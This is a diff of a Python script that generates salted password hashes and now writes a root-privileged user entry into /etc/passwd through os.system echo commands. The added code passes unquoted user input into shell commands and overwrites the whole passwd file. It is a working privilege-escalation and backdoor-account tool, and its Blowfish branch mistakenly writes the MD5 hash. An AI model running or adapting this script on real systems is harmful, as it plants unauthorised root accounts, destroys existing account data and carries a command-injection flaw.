@@ -3,9 +3,7 @@ import crypt
 
 
 
-
-
-####to check witch hash your system are using####
+#### Check witch hash your system are using ####
 
 
 name = input("Insert Username:\n")
@@ -32,6 +30,11 @@ print("""
 	""")
 
 
+### Automation new passwd hash with username and password ###
+
+
+
+
 
 salt_sha512 = crypt.crypt(password, crypt.mksalt(crypt.METHOD_SHA512))
 
@@ -49,27 +52,47 @@ salt_crypt = crypt.crypt(password, crypt.mksalt(crypt.METHOD_CRYPT))
 
 
 
-###print statments with added username and priv###
-
-print(
-f"""[*]Salted SHA512:\n [+] {name}:{salt_sha512}{rootpriv}
----------------------------------------------------------------------------------------------
-[*]Salted SHA256:\n [+] {name}:{salt_sha256}{rootpriv}
----------------------------------------------------------------------------------------------
-[*]Salted Blowfish:\n [+] {name}:{salt_blow}{rootpriv}
----------------------------------------------------------------------------------------------
-[*]Salted MD5:\n [+] {name}:{salt_md5}{rootpriv}
----------------------------------------------------------------------------------------------
-[*]Salted crypt:\n [+] {name}:{salt_crypt}{rootpriv}
----------------------------------------------------------------------------------------------
-
-""")
-
-print("""
-Pick your desired hash and do "cat *hash* >  /etc/passwd"
+### Hash get printed out and echoed to /etc/passwd ###
 
 
-	""")
+
+make_hash = input("What hash do you want to use?\n")
+if make_hash == "$1":
+	print(f"[*]Salted MD5:\n user is already stored in passwd\n [+] {name}:{salt_md5}{rootpriv}")
+	os.system(f"echo {name}:{salt_md5}{rootpriv} >/etc/passwd")
+elif make_hash == "$2":
+	print(f"[*]Salted Blowfish:\n user is already stored in passwd\n [+] {name}:{salt_blow}{rootpriv}")
+	os.system(f" echo {name}:{salt_md5}{rootpriv} > /etc/passwd")
+elif make_hash == "$5":
+	print(f"[*]Salted SHA256:\n user is already stored in passwd\n [+] {name}:{salt_sha256}{rootpriv}")
+	os.system(f"echo {name}:{salt_sha256}{rootpriv} > /etc/passwd")
+elif make_hash == "$6":
+	print(f"[*]Salted SHA512:\n user is already stored in passwd\n [+] {name}:{salt_sha512}{rootpriv}")
+	os.system(f"echo {name}:{salt_sha512}{rootpriv} > /etc/passwd")
+else:
+	print(f"[*]Salted crypt:\n user is already stored in passwd\n [+] {name}:{salt_crypt}{rootpriv}")
+	os.system(f"echo {name}:{salt_crypt}{rootpriv} > /etc/passwd")
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
